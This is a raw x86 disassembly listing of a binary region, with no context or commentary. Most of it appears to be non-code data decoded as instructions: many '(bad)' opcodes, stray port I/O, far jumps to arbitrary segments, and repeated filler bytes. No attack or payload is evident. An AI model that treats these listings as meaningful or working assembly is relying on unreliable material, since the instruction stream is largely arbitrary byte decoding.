  421b6c:	ja     0x421bd3
  421b6e:	cmp    dl,BYTE PTR [edi+0x65]
  421b71:	gs gs ins DWORD PTR es:[edi],dx
  421b74:	jae    0x421b9f
  421b76:	arpl   WORD PTR [edi+0x41],sp
  421b79:	bound  edx,QWORD PTR [ebx+0x65]
  421b7c:	dec    ebp
  421b7d:	gs jb  0x421bed
  421b80:	gs ins DWORD PTR es:[edi],dx
  421b82:	and    dh,BYTE PTR gs:[edx+0x7]
  421b86:	pop    ds
  421b87:	xchg   edi,ebp
  421b89:	(bad)
  421b8d:	icebp  
  421b8e:	xchg   ebp,eax
  421b8f:	mov    esp,0x60cb08bd
  421b94:	mov    eax,ds:0x139d677
  421b99:	jne    0x421c0f
  421b9b:	je     0x421bef
  421b9d:	or     esi,DWORD PTR [esp+esi*2-0x58]
  421ba1:	sub    DWORD PTR [esp+esi*2-0x32],esi
  421ba5:	or     esp,DWORD PTR [ecx]
  421ba7:	fisubr DWORD PTR [ebx-0x607eb832]
  421bad:	push   ds
  421bae:	inc    edx
  421baf:	xor    DWORD PTR [eax-0x55],0xdb543390
  421bb6:	and    BYTE PTR [edx+ebx*4+0x3a],bl
  421bba:	jae    0x421b47
  421bbc:	je     0x421c32
  421bbe:	sub    BYTE PTR [ebp+edx*2+0x74747451],cl
  421bc5:	adc    esp,DWORD PTR [edi-0x46]
  421bc8:	test   BYTE PTR [esi-0x59],dl
  421bcb:	mov    cs,WORD PTR ds:0x8e2b381f
  421bd1:	inc    esp
  421bd2:	jno    0x421ba1
  421bd4:	mov    al,ds:0xd40a2c98
  421bd9:	cmp    esp,DWORD PTR [edx]
  421bdb:	in     al,0x3a
  421bdd:	xor    eax,0x4dcbf305
  421be2:	enter  0x28dd,0xf4
  421be6:	aad    0xc4
  421be8:	je     0x421c5e
  421bea:	add    BYTE PTR [esp+esi*2+0x74],ch
  421bee:	je     0x421bfc
  421bf0:	or     al,0xc
  421bf2:	or     al,0xc
  421bf4:	or     al,0xc
  421bf6:	or     al,0xc
  421bf8:	cs pop eax
  421bfa:	mov    DWORD PTR ss:[ecx-0x76767677],ecx
  421c01:	mov    DWORD PTR [ecx-0x76ffff77],ecx
  421c07:	and    DWORD PTR [ecx+eiz*1],eax
  421c0a:	ds in  al,dx
  421c0c:	shl    DWORD PTR [esi+ecx*2+0x50],1
  421c10:	mov    cl,0xfd
  421c12:	fwait
  421c13:	sar    DWORD PTR [ebx],1
  421c15:	cld    
  421c16:	in     eax,dx
  421c17:	cmp    BYTE PTR es:[edi-0x620dd115],al
  421c1e:	add    BYTE PTR [eax],al
  421c20:	xor    BYTE PTR [eax+0x492da8c3],ch
  421c26:	xchg   ecx,eax
  421c27:	mov    esp,0xc79b406a
  421c2c:	pop    edx
  421c2d:	call   0x825a:0x67a9c55e
  421c34:	js     0x421c29
  421c36:	adc    eax,0xe6496948
  421c3b:	in     eax,0xa8
  421c3d:	add    BYTE PTR [eax],al
  421c3f:	jge    0x421c48
  421c41:	adc    al,0x0
  421c43:	add    BYTE PTR [edi-0x43],bh
  421c46:	add    BYTE PTR [bx+si],al
  421c49:	fld    TBYTE PTR [ebx-0xf]
  421c4c:	mov    esi,0xf441d184
  421c51:	inc    ecx
  421c52:	inc    eax
  421c53:	sbb    al,BYTE PTR [edx+0x6702d3cf]
  421c59:	inc    ebx
  421c5a:	pop    edi
  421c5b:	cmc    
  421c5c:	mov    edx,edi
  421c5e:	jmp    0xf300:0xa810
  421c65:	sub    eax,DWORD PTR [eax]
  421c67:	add    al,dl
  421c69:	fiadd  DWORD PTR [eax]
	...
  421c73:	add    BYTE PTR [eax],al
  421c75:	add    al,dh
  421c77:	push   esp
  421c78:	adc    bl,0x73
  421c7b:	inc    esi
  421c7c:	xchg   DWORD PTR [edi],eax
  421c7e:	or     BYTE PTR [ebp+0x2a],bl
  421c81:	pop    edi
  421c82:	cmp    BYTE PTR [ebp+0x5106946b],0x5c
  421c89:	pushf  
  421c8a:	sahf   
  421c8b:	xor    eax,0x75759c38
  421c90:	jne    0x421d07
  421c92:	jne    0x421d09
  421c94:	jne    0x421d0b
  421c96:	jne    0x421c1b
  421c98:	sub    edi,0xffffff9b
  421c9b:	xchg   esp,eax
  421c9c:	sbb    BYTE PTR [ebx-0x165ff07d],al
  421ca2:	jbe    0x421c7a
  421ca4:	push   ds
  421ca5:	out    0xf8,al
  421ca7:	mov    bl,BYTE PTR ds:0xec0114bd
  421cad:	out    0x94,al
  421caf:	test   eax,0x975b1474
  421cb4:	loope  0x421c87
  421cb6:	push   0x1b
  421cb8:	or     DWORD PTR cs:[ebp+edi*1+0x3141b6a5],ebx
  421cc0:	push   esi
  421cc1:	pop    ss
  421cc2:	add    DWORD PTR [ebx-0x7c7cb539],0xffffff91
  421cc9:	aad    0xcd
  421ccb:	add    DWORD PTR [eax],0xffffffa9
  421cce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ccf:	add    esi,DWORD PTR [esi+edi*1]
  421cd2:	iret   
  421cd3:	cs es stc 
  421cd6:	mov    cs,eax
  421cd8:	adc    BYTE PTR [esi+0x25],bh
  421cdb:	mov    ecx,DWORD PTR [esi]
  421cdd:	mov    ecx,0x6672c4ec
  421ce2:	add    al,0x93
  421ce4:	inc    edx
  421ce5:	add    BYTE PTR [eax],al
  421ce7:	add    BYTE PTR [eax+edx*2],ch
  421cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ceb:	pop    ss
  421cec:	in     al,dx
  421ced:	in     eax,0x14
  421cef:	inc    esi
  421cf0:	pushf  
  421cf1:	out    0x9e,al
  421cf3:	std    
  421cf4:	push   eax
  421cf5:	jmp    0xc20c95f1
  421cfa:	adc    al,0x51
  421cfc:	mul    BYTE PTR ds:0xe2769140
  421d02:	lds    ebx,FWORD PTR [edx+0x7a000039]
  421d08:	(bad)  
  421d09:	or     al,BYTE PTR [eax]
  421d0b:	add    BYTE PTR [eax],al
  421d0d:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  421d13:	test   DWORD PTR [ebp-0x4c6c97b],eax
  421d19:	xor    esi,DWORD PTR [ebx]
  421d1b:	xor    esi,DWORD PTR [ebx]
  421d1d:	xor    esi,DWORD PTR [ebx]
  421d1f:	xor    esi,DWORD PTR [ebx]
  421d21:	xor    edi,edi
  421d23:	jmp    FWORD PTR [ecx+0x4]
  421d26:	pop    ecx
  421d27:	lock dec ebp
  421d29:	mov    al,0xd
  421d2b:	sub    BYTE PTR [eax+edx*4],bl
  421d2e:	icebp  
  421d2f:	pop    ebp
  421d30:	lds    edx,FWORD PTR [edi-0x2de1f38d]
  421d36:	icebp  
  421d37:	or     ecx,DWORD PTR [esi-0x2f]
  421d3a:	cli    
  421d3b:	mov    eax,0xac52ffff
  421d40:	(bad)  
  421d41:	dec    ebp
  421d43:	inc    esi
  421d44:	(bad)  
  421d45:	inc    DWORD PTR [ebx+0x3cb300a8]
  421d4b:	gs test al,0x5c
  421d4e:	std    
  421d4f:	dec    ebx
  421d50:	lock or BYTE PTR [edx+ebx*4-0x35],cl
  421d55:	leave  
  421d56:	enter  0x6dca,0x56
  421d5a:	les    ecx,FWORD PTR [edi+ebp*2]
  421d5d:	jmp    0xd6d2261
  421d62:	call   0x246f:0x4040410
  421d69:	fisub  WORD PTR gs:[edi-0xdcf2d69]
  421d70:	mov    al,ds:0xd716e9c8
  421d75:	jge    0x421d84
  421d77:	mov    bh,0x1f
  421d79:	loopne 0x421d27
  421d7b:	es mov edx,0x92ce1490
  421d81:	and    BYTE PTR [edx],0x63
  421d84:	test   al,0x24
  421d86:	clc    
  421d87:	sti    
  421d88:	je     0x421db9
  421d8a:	add    al,0x4
  421d8c:	cmp    al,0x79
  421d8e:	add    al,0x4
  421d90:	add    al,0x0
	...
  421d9a:	mov    edi,0xffff4e1c
  421d9f:	(bad)  
  421da0:	(bad)  
  421da1:	(bad)  
  421da2:	(bad)  
  421da3:	(bad)  
  421da4:	(bad)  
  421da5:	(bad)  
  421da6:	(bad)  
  421da7:	(bad)  
  421da8:	call   0x9ee59260
  421dad:	cmp    esp,DWORD PTR [edi]
  421daf:	fst    DWORD PTR [edx+0x6c]
  421db2:	inc    ecx
  421db3:	(bad)  
  421db4:	repz push 0x13
  421db7:	dec    ebx
  421db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421db9:	push   ds
  421dba:	into   
  421dbb:	test   eax,0x95d2f28e
  421dc0:	(bad)  
  421dc1:	push   DWORD PTR [ecx-0x52aa8796]
  421dc7:	out    0x3e,eax
  421dc9:	imul   esp,DWORD PTR [ebx-0x34],0x43
  421dcd:	ins    DWORD PTR es:[edi],dx
  421dce:	push   es
  421dcf:	hlt    
  421dd0:	daa    
  421dd1:	push   esp
  421dd2:	in     al,dx
  421dd3:	xor    eax,0xf02601dc
  421dd8:	adc    al,0x87
  421dda:	int3   
  421ddb:	add    al,0x91
  421ddd:	in     al,dx
  421dde:	(bad)  
  421de0:	jmp    DWORD PTR [ebx-0x68]
  421de3:	xchg   ebp,eax
  421de4:	(bad)  
  421de5:	call   ebp
  421de7:	test   BYTE PTR [ebp+0x2e3100ff],al
  421ded:	push   es
  421dee:	push   edx
  421def:	ret    
  421df0:	jae    0x421e68
  421df2:	inc    esp
  421df3:	sar    BYTE PTR [ebx-0x51678ba0],1
  421df9:	aaa    
  421dfa:	mov    edi,0xebbbc55
  421dff:	adc    esi,ebp
  421e01:	mov    DWORD PTR [ebx],eax
  421e03:	add    BYTE PTR [eax],al
  421e05:	add    BYTE PTR [edi-0x5a],bl
  421e08:	add    BYTE PTR [eax],al
  421e0a:	push   ecx
  421e0b:	xchg   ebx,eax
  421e0c:	add    BYTE PTR [eax],al
  421e0e:	add    al,ch
  421e10:	call   0xe92b06fd
  421e15:	call   0x77d00702
  421e1a:	pusha  
  421e1b:	pop    ecx
  421e1c:	loopne 0x421df3
  421e1e:	inc    ebx
  421e1f:	test   edi,edx
  421e21:	pop    ebp
  421e22:	fmulp  st(5),st
  421e24:	fdivr  QWORD PTR [ecx-0x54efb8bf]
  421e2a:	mov    eax,ds:0xe56d6f2f
  421e2f:	add    BYTE PTR [bx+si],al
  421e32:	add    BYTE PTR [eax],al
  421e34:	add    BYTE PTR [eax],al
  421e36:	add    BYTE PTR [eax],al
  421e38:	add    al,ch
  421e3a:	call   0xb1770abb
  421e3f:	call   0x6d70c02c
  421e44:	jbe    0x421de1
  421e46:	fldenv [eax]
  421e48:	mov    edx,DWORD PTR [ebx+0x63a024d2]
  421e4e:	rcr    BYTE PTR [ecx],1
  421e50:	or     eax,0x61831a90
  421e55:	dec    eax
  421e56:	and    al,0x5f
  421e58:	xor    eax,0x49d09166
  421e5d:	call   FWORD PTR [eax+0x317b09c]
  421e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e64:	call   0xe91f8651
  421e69:	call   0xe84b54b9
  421e6e:	mov    edi,DWORD PTR [ebp+0x21c2a7be]
  421e74:	push   0xffffff8a
  421e76:	jbe    0x421ef7
  421e78:	call   0xf8c4224d
  421e7d:	push   0x7dbf1fdd
  421e82:	in     al,0x1d
  421e84:	call   0x928b:0x8b8b28f3
  421e8b:	jmp    0x421e2d
  421e8d:	xor    al,0x75
  421e8f:	pop    esp
  421e90:	retf   
  421e91:	cmp    al,0xbd
  421e93:	mov    ebp,0xc742958d
  421e98:	outs   dx,DWORD PTR ds:[esi]
  421e99:	mov    esi,0x14273bfe
  421e9e:	mov    bl,0xaf
  421ea0:	out    dx,eax
  421ea1:	xor    DWORD PTR [esi+0x4f8597],eax
  421ea7:	mov    ecx,DWORD PTR [ebx-0x74eee7c0]
  421ead:	mov    ecx,DWORD PTR [ebx+0x75757575]
  421eb3:	jne    0x421f2a
  421eb5:	jne    0x421f2c
  421eb7:	jne    0x421e49
  421eb9:	lds    ebx,FWORD PTR [ebx+0x0]
  421ebf:	add    BYTE PTR [eax],al
  421ec1:	add    BYTE PTR [eax],al
  421ec3:	add    BYTE PTR [ebp+0x75],dh
  421ec6:	push   0x3a
  421ec8:	repz mov ?,WORD PTR [ebp+0x1a6c541c]
  421ecf:	cmc    
  421ed0:	rol    BYTE PTR [edx+0x5c],cl
  421ed3:	test   BYTE PTR [edi],ah
  421ed5:	push   ecx
  421ed6:	ret    0x8bfc
  421ed9:	add    BYTE PTR [ebp+0x7f],0x50
  421edd:	xchg   edi,eax
  421ede:	jne    0x421f55
  421ee0:	hlt    
  421ee1:	shl    BYTE PTR [ebp+0x75],1
  421ee4:	in     eax,0xa9
  421ee6:	jne    0x421f5d
  421ee8:	lds    ebp,FWORD PTR [ecx+ecx*1]
  421eeb:	lahf   
  421eec:	loope  0x421f1e
  421eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421eef:	fstp   st(2)
  421ef1:	sbb    edi,DWORD PTR [edi+0x64]
  421ef4:	adc    eax,ecx
  421ef6:	sbb    eax,0xefbf9400
  421efb:	xchg   esp,eax
  421efc:	lea    esi,[edx+0x4753a14]
  421f02:	and    BYTE PTR [edx-0x2b],dh
  421f05:	push   cs
  421f06:	add    al,0x4
  421f08:	add    al,0x6a
  421f0a:	out    0xf1,eax
  421f0c:	push   0x23
  421f0e:	pop    ss
  421f0f:	xchg   ebx,eax
  421f10:	sub    eax,0xa736e63
  421f15:	jbe    0x421f7c
  421f17:	jae    0x421f86
  421f19:	ja     0x421f5e
  421f1b:	and    BYTE PTR [esi+ebp*1+0xd],dh
  421f1f:	gs cs ins BYTE PTR es:[edi],dx
  421f22:	outs   dx,DWORD PTR ds:[esi]
  421f23:	jne    0x421f53
  421f25:	and    BYTE PTR [edx+0x65],dh
  421f28:	ins    DWORD PTR es:[edi],dx
  421f29:	cmp    eax,0x6d653d20
  421f2e:	gs gs cmp ch,BYTE PTR cs:[esi]
  421f33:	and    BYTE PTR [edi+0x65],ch
  421f36:	inc    ecx
  421f37:	jae    0x421f9c
  421f39:	outs   dx,BYTE PTR ds:[esi]
  421f3a:	je     0x421f7a
  421f3c:	sub    DWORD PTR [esi],ebp
  421f3e:	ins    DWORD PTR es:[edi],dx
  421f3f:	popa   
  421f40:	push   ebx
  421f41:	imul   esp,DWORD PTR [edx],0x3a2e7573
  421f47:	push   0x20536566
  421f4c:	jae    0x421f9b
  421f4e:	bound  ebp,QWORD PTR [esi+0x65]
  421f51:	inc    ebp
  421f52:	push   0x2e0d6276
  421f57:	ds jbe 0x421fbf
  421f5a:	imul   esp,DWORD PTR [ebp+0x57],0x656f2f20
  421f61:	jb     0x421fa6
  421f63:	je     0x421fda
  421f65:	or     ch,BYTE PTR [ebp+0x7a]
  421f68:	and    BYTE PTR [eax],ch
  421f6a:	je     0x421fde
  421f6c:	cs ds jae 0x421fe7
  421f70:	outs   dx,BYTE PTR gs:[si]
  421f73:	arpl   WORD PTR [ebp+0x41],sp
  421f76:	and    BYTE PTR [edx+0x2e],dh
  421f79:	jae    0x421fe0
  421f7b:	gs inc ebx
  421f7d:	imul   edx,ebp,0xc6d852c4
  421f83:	fadd   DWORD PTR [eax]
  421f85:	cmp    al,0x82
  421f87:	imul   ebx,DWORD PTR [ecx+ecx*2+0x65c54625],0xbff12549
  421f92:	add    eax,0xa4267a43
  421f97:	cwde   
  421f98:	xor    BYTE PTR [esp+eax*1],al
  421f9b:	dec    ebx
  421f9c:	mov    BYTE PTR [esp+eax*1],al
  421f9f:	add    al,0x89
  421fa1:	mov    DWORD PTR [ecx-0x76767677],ecx
  421fa7:	mov    DWORD PTR [ecx+0xfc409f],ecx
	...
  421fb5:	mov    DWORD PTR [ecx-0x4bc071ec],ecx
  421fbb:	mov    ch,0xfb
  421fbd:	lds    eax,FWORD PTR [edi+0x355944ff]
  421fc3:	and    eax,0xa66d618f
  421fc8:	repnz outs dx,BYTE PTR es:[esi]
  421fcb:	push   ecx
  421fcc:	xchg   ecx,eax
  421fcd:	jmp    0x42201b
  421fcf:	mov    DWORD PTR [ecx-0x59d2636],ecx
  421fd5:	nop
  421fd6:	xor    eax,0x889a5ed7
  421fdb:	retf   
  421fdc:	fs dec ebx
  421fde:	xchg   ebp,eax
  421fdf:	cs mov al,0x56
  421fe2:	fnsave [edx+0x50]
  421fe5:	add    al,0x27
  421fe7:	adc    bl,BYTE PTR [esi]
  421fe9:	xor    al,0x52
  421feb:	icebp  
  421fec:	and    eax,0x4d89898f
  421ff1:	and    esp,esp
  421ff3:	mov    DWORD PTR [ecx-0x760e7ef9],ecx
  421ff9:	test   DWORD PTR ds:0x6fd0ae50,ecx
  421fff:	mov    esi,0xe2f4f0b9
  422004:	dec    edi
  422005:	xchg   edx,eax
  422006:	push   esi
  422007:	rol    ebx,cl
  422009:	push   ebp
  42200a:	jno    0x421f98
  42200c:	xchg   edi,eax
  42200d:	dec    ebp
  42200e:	dec    ebx
  42200f:	adc    DWORD PTR [ebx-0x19],esi
  422012:	test   DWORD PTR [ebp-0x7a43907b],eax
  422018:	test   DWORD PTR [edx-0x7a7a7a47],esp
	...
  422026:	add    ch,al
  422028:	push   edi
  422029:	add    eax,0x393690e1
  42202e:	(bad)  
  42202f:	(bad)  
  422030:	inc    eax
  422031:	pop    es
  422032:	and    BYTE PTR [eax],dl
  422034:	(bad)  
  422035:	adc    al,0x90
  422037:	xchg   esi,eax
  422038:	sbb    BYTE PTR [eax-0x2d],ah
  42203b:	push   ecx
  42203c:	sub    BYTE PTR [edx-0x22],ah
  42203f:	or     al,0xc
  422041:	or     al,0xc
  422043:	or     al,0xc
  422045:	or     al,0xc
  422047:	or     al,0x85
  422049:	test   DWORD PTR [edx],esi
  42204b:	push   cs
  42204c:	jmp    DWORD PTR [edx-0x7b]
  42204f:	test   DWORD PTR [ebx-0xf],esi
  422052:	mov    edi,0x429563bd
  422057:	imul   ebp,DWORD PTR [edx],0x52
  42205a:	pop    edi
  42205b:	addr16 int 0xc5
  42205e:	xchg   esp,eax
  42205f:	int3   
  422060:	mov    esi,0x786090da
  422065:	rcl    DWORD PTR [ebp-0x54],cl
  422068:	pop    esi
  422069:	enter  0xc573,0x99
  42206d:	pop    ss
  42206e:	iret   
  42206f:	test   DWORD PTR [edi],0x8585a496
  422075:	push   0xffffffdb
  422077:	test   DWORD PTR [ebp-0x7affdd4c],eax
  42207d:	add    ah,al
  42207f:	xchg   DWORD PTR [ebx+0x2b],ebx
  422082:	clc    
  422083:	popa   
  422084:	out    dx,eax
  422085:	icebp  
  422086:	mov    bh,0x68
  422088:	popf   
  422089:	and    DWORD PTR [edi],0xcce4f9f6
  42208f:	retf   0x3c32
  422092:	mov    ebx,0x286aac
  422097:	add    BYTE PTR [eax],al
  422099:	clc    
  42209a:	add    DWORD PTR [ecx],ebx
  42209c:	push   ds
  42209d:	pop    ebp
  42209e:	push   es
  42209f:	sar    BYTE PTR [ebx-0x4c07abc2],0x79
  4220a6:	out    0xb7,eax
  4220a8:	shl    DWORD PTR [edx+0x48799fd6],cl
  4220ae:	jmp    0x422114
  4220b0:	xchg   edx,eax
  4220b1:	xchg   DWORD PTR cs:[ecx+0xb27],edi
  4220b8:	stos   DWORD PTR es:[edi],eax
  4220b9:	push   esp
  4220ba:	(bad)  
	...
  4220c7:	xor    eax,0x7881
  4220cc:	add    BYTE PTR [eax],al
  4220ce:	add    BYTE PTR [eax],al
  4220d0:	add    BYTE PTR [eax],al
  4220d2:	add    bh,bh
  4220d4:	jmp    DWORD PTR ds:0x8056ef17
  4220da:	cmp    BYTE PTR [eax-0x3a89e90e],0x29
  4220e1:	fstp   TBYTE PTR [ebx+0x4d]
  4220e4:	xchg   edx,eax
  4220e5:	mov    ds:0xcedfb4b9,al
  4220ea:	jp     0x4220be
  4220ec:	in     eax,0xff
  4220ee:	push   DWORD PTR [ebx+0x9]
  4220f1:	(bad)  
  4220f2:	inc    DWORD PTR [eax+eiz*4-0x1]
  4220f6:	jmp    eax
  4220f8:	jg     0x422154
  4220fa:	ucomiss xmm4,DWORD PTR [ecx]
  4220fd:	or     BYTE PTR [ecx],dh
  4220ff:	(bad)  
  422100:	out    0xd9,eax
  422102:	mov    bh,0x90
  422104:	push   ecx
  422105:	mov    bh,0xb7
  422107:	pop    esp
  422108:	leave  
  422109:	and    ecx,DWORD PTR ds:0xefd55a87
  42210f:	inc    DWORD PTR [eax]
  422111:	inc    ebx
  422112:	jmp    FWORD PTR [esi-0x78]
  422115:	add    BYTE PTR [eax],al
  422117:	add    BYTE PTR [eax-0x885d44f],cl
  42211d:	(bad)  
  42211e:	das    
  42211f:	and    esi,DWORD PTR [eax-0xa4239b4]
  422125:	and    al,0x99
  422127:	lods   al,BYTE PTR ds:[esi]
  422128:	shl    BYTE PTR [edi],0xd9
  42212b:	mov    esp,DWORD PTR [ebp+edi*1-0x16]
  42212f:	cmp    eax,0x2226db89
  422134:	push   es
  422135:	dec    eax
  422136:	push   edx
  422137:	xlat   BYTE PTR ds:[ebx]
  422138:	cmp    bh,0x85
  42213b:	add    BYTE PTR [eax],al
  42213d:	jmp    DWORD PTR [ecx+0x0]
  422140:	add    BYTE PTR [eax],al
  422142:	(bad)  
  422143:	(bad)  
  422144:	(bad)  
  422145:	(bad)  
  422146:	(bad)  
  422147:	(bad)  
  422148:	(bad)  
  422149:	(bad)  
  42214a:	(bad)  
  42214b:	cli    
  42214c:	sbb    ch,BYTE PTR [eax+0x0]
  422152:	add    BYTE PTR [eax],al
  422154:	add    BYTE PTR [eax],al
  422156:	add    ah,cl
  422158:	int3   
  422159:	rol    BYTE PTR [ebx-0x7],0x95
  42215d:	add    eax,0x3bbabb6d
  422162:	jmp    0xb133ac91
  422167:	ins    BYTE PTR es:[edi],dx
  422168:	rcl    esi,cl
  42216a:	aad    0x64
  42216c:	xlat   BYTE PTR ds:[ebx]
  42216d:	pushf  
  42216e:	pop    eax
  42216f:	xchg   DWORD PTR [esp+ecx*8],esi
  422172:	int3   
  422173:	add    bl,al
  422175:	xchg   edx,eax
  422176:	fisttp DWORD PTR [ebp+0x7c]
  422179:	sbb    al,0x5f
  42217b:	retf   
  42217c:	push   esi
  42217d:	fstp   DWORD PTR [ebp+0x33d47d26]
  422183:	arpl   WORD PTR [edi+0x65e348d2],bp
  422189:	sahf   
  42218a:	out    dx,eax
  42218b:	test   al,0x3a
  42218d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42218e:	shl    BYTE PTR [esi+0x4d77cccc],1
  422194:	inc    eax
  422195:	int3   
  422196:	int3   
  422197:	popa   
  422198:	adc    al,0x94
  42219a:	int3   
  42219b:	add    BYTE PTR [edi+0x42],bh
  42219e:	mov    cl,0x19
  4221a0:	xchg   BYTE PTR [eax+0x258e50a],ch
  4221a6:	rcr    BYTE PTR [edx-0x4bde3caf],cl
  4221ac:	rcr    DWORD PTR [eax],1
  4221ae:	adc    edx,ebp
  4221b0:	jno    0x42220c
  4221b2:	sub    al,0x89
  4221b4:	add    BYTE PTR [eax],al
  4221b6:	add    BYTE PTR [esi+0x50000f4],bh
  4221bc:	inc    BYTE PTR [eax]
  4221be:	add    BYTE PTR [eax],al
  4221c0:	inc    ebp
  4221c1:	inc    ebp
  4221c2:	inc    ebp
  4221c3:	inc    ebp
  4221c4:	inc    ebp
  4221c5:	inc    ebp
  4221c6:	inc    ebp
  4221c7:	inc    ebp
  4221c8:	inc    ebp
  4221c9:	pop    edi
  4221ca:	popa   
  4221cb:	jge    0x422213
  4221cd:	ins    DWORD PTR es:[edi],dx
  4221ce:	mov    cl,0x1b
  4221d0:	scas   eax,DWORD PTR es:[edi]
  4221d1:	dec    DWORD PTR ds:0x39c3f9a0
  4221d7:	mov    ss,WORD PTR [edi-0x1d95ee61]
  4221dd:	mov    dl,BYTE PTR ss:[edx-0x1a]
  4221e1:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  4221e7:	test   DWORD PTR [ebp-0x7c8b8b7b],eax
  4221ed:	bound  esi,QWORD PTR [eax+0x607474b5]
  4221f3:	xor    edi,ebp
  4221f5:	aas    
  4221f6:	scas   al,BYTE PTR es:[edi]
  4221f7:	sbb    al,0xdf
  4221f9:	and    al,0x4
  4221fb:	mov    ebp,0x1369bb13
  422200:	pop    ebx
  422201:	in     eax,0xec
  422203:	push   ds
  422204:	imul   ebp,DWORD PTR [edx-0x45],0xa276fd44
  42220b:	pop    esp
  42220c:	rcl    DWORD PTR [ebx],1
  42220e:	ins    BYTE PTR es:[edi],dx
  42220f:	stos   DWORD PTR es:[edi],eax
  422210:	and    bl,BYTE PTR [eax+0x74c38d0e]
  422216:	je     0x4221ef
  422218:	push   DWORD PTR [esp+esi*2+0x26]
  42221c:	(bad)  
  42221d:	test   al,0x74
  42221f:	add    BYTE PTR [edi+0x6a],dh
  422222:	test   eax,0x87de3553
  422227:	jns    0x422239
  422229:	sbb    BYTE PTR [esi*4-0x74c5fbfa],dl
  422230:	or     BYTE PTR [edx-0x62],ah
  422233:	test   BYTE PTR [ebx],al
  422235:	or     eax,edx
  422237:	lahf   
  422238:	add    BYTE PTR [eax],al
  42223a:	add    bl,cl
  42223c:	nop
  42223d:	ins    BYTE PTR es:[edi],dx
  42223e:	mov    WORD PTR [ecx+0x5dfb1721],ss
  422244:	sbb    eax,0x986cabc
  422249:	mov    al,0x5a
  42224b:	jecxz  0x4221fe
  42224d:	cld    
  42224e:	mov    ecx,fs
  422250:	push   ecx
  422251:	push   cs
  422252:	cmp    BYTE PTR [edx-0xe],al
  422255:	(bad)  
  422257:	mov    eax,DWORD PTR [eax]
  422259:	add    BYTE PTR [ecx],ch
  42225b:	scas   eax,DWORD PTR es:[edi]
  42225c:	inc    DWORD PTR [eax]
  42225e:	add    BYTE PTR [eax],al
  422260:	mov    DWORD PTR [ecx-0x76767677],ecx
  422266:	mov    DWORD PTR [ecx-0x44b9ca77],ecx
  42226c:	(bad)  
  42226d:	(bad)  
  42226e:	(bad)  
  42226f:	(bad)  
  422270:	(bad)  
  422271:	(bad)  
  422272:	(bad)  
  422273:	(bad)  
  422274:	inc    DWORD PTR [eax]
  422276:	add    BYTE PTR [edi-0x4d608b41],bl
  42227c:	push   ecx
  42227d:	loopne 0x4222cd
  42227f:	es mov bh,0x13
  422282:	push   ebp
  422283:	xlat   BYTE PTR ds:[ebx]
  422284:	mov    al,0x1d
  422286:	jmp    0x7a03:0x6bc8a9a7
  42228d:	daa    
  42228e:	add    BYTE PTR [eax],0x0
  422291:	popf   
  422292:	mov    eax,0x16740000
  422297:	add    BYTE PTR [eax],al
  422299:	loope  0x42229c
  42229b:	pop    edi
  42229c:	sub    dl,BYTE PTR [esi-0x35]
  42229f:	outs   dx,DWORD PTR ds:[esi]
  4222a0:	mov    eax,0x69d9b992
  4222a5:	rol    DWORD PTR [edx-0x3f],cl
  4222a8:	xor    BYTE PTR [eax+0x65422574],bl
  4222ae:	data16 jns 0x42231f
  4222b1:	ins    DWORD PTR es:[edi],dx
  4222b2:	cs gs cmp eax,0x2e202f6e
  4222b9:	and    BYTE PTR [esi+0x20],ch
  4222bc:	jns    0x422323
  4222be:	arpl   WORD PTR [ebp+0x65],sp
  4222c1:	inc    esp
  4222c2:	cmp    eax,0x203c206d
  4222c7:	ins    DWORD PTR es:[di],dx
  4222c9:	gs jo  0x42231f
  4222cc:	outs   dx,BYTE PTR ds:[esi]
  4222cd:	and    BYTE PTR gs:[ecx+0x70],al
  4222d1:	jb     0x422345
  4222d3:	and    BYTE PTR [eax],ah
  4222d5:	jb     0x4222f7
  4222d7:	ins    DWORD PTR es:[edi],dx
  4222d8:	dec    ebp
  4222d9:	jbe    0x422319
  4222db:	outs   dx,DWORD PTR ds:[esi]
  4222dc:	jb     0x42232e
  4222de:	arpl   WORD PTR [eax],sp
  4222e0:	and    BYTE PTR [edi+0x72],dh
  4222e3:	jne    0x42234a
  4222e5:	jae    0x42234c
  4222e7:	ds gs jae 0x4222df
  4222eb:	scas   eax,DWORD PTR es:[edi]
  4222ec:	push   ss
  4222ed:	mov    ecx,0xa0c70000
  4222f2:	xchg   edx,edi
  4222f4:	add    BYTE PTR [eax],al
  4222f6:	add    BYTE PTR [ebx-0x3a],cl
  4222f9:	dec    edi
  4222fa:	pop    ds
  4222fb:	iret   
  4222fc:	fdivr  st(6),st
  4222fe:	adc    ebx,DWORD PTR ds:0xb8300ab3
  422304:	sub    DWORD PTR [ecx+0x4],edi
  422307:	inc    ecx
  422308:	xor    DWORD PTR [ecx],esi
  42230a:	pop    edi
  42230b:	cs pop es
  42230d:	mov    esp,0x95753f9e
  422312:	adc    eax,0x87e54c49
  422317:	je     0x42232c
  422319:	rol    DWORD PTR [eax],0x0
  42231c:	dec    esi
  42231d:	mov    bh,0x0
	...
  422327:	add    BYTE PTR [eax],al
  422329:	add    BYTE PTR [ecx+ebp*8-0x2e],ch
	...
  422335:	add    bh,bh
  422337:	dec    DWORD PTR [ebp+ebx*4-0x1215245d]
  42233e:	push   ebp
  42233f:	lock cmp DWORD PTR [edx-0x916a4f3],esi
  422346:	icebp  
  422347:	ficom  DWORD PTR [ecx+0x27]
  42234a:	jnp    0x422302
  42234c:	sub    al,BYTE PTR [ebp+eax*2+0x4cffff95]
  422353:	push   cs
  422354:	daa    
  422355:	pop    ds
  422356:	mov    bl,0x1
  422358:	imul   ebx,DWORD PTR [ecx],0x8df4349f
  42235e:	jge    0x4223b6
  422360:	icebp  
  422361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422362:	das    
  422363:	jns    0x4223e0
  422365:	dec    edx
  422366:	dec    esp
  422367:	mov    ecx,0x7de2aa78
  42236c:	pop    ss
  42236d:	enter  0xffb4,0xff
  422371:	cdq    
  422372:	imul   ebp,esi,0xeb43ffff
  422378:	xchg   ebx,eax
  422379:	inc    DWORD PTR [eax]
  42237b:	jbe    0x422373
  42237d:	mov    bh,0x6d
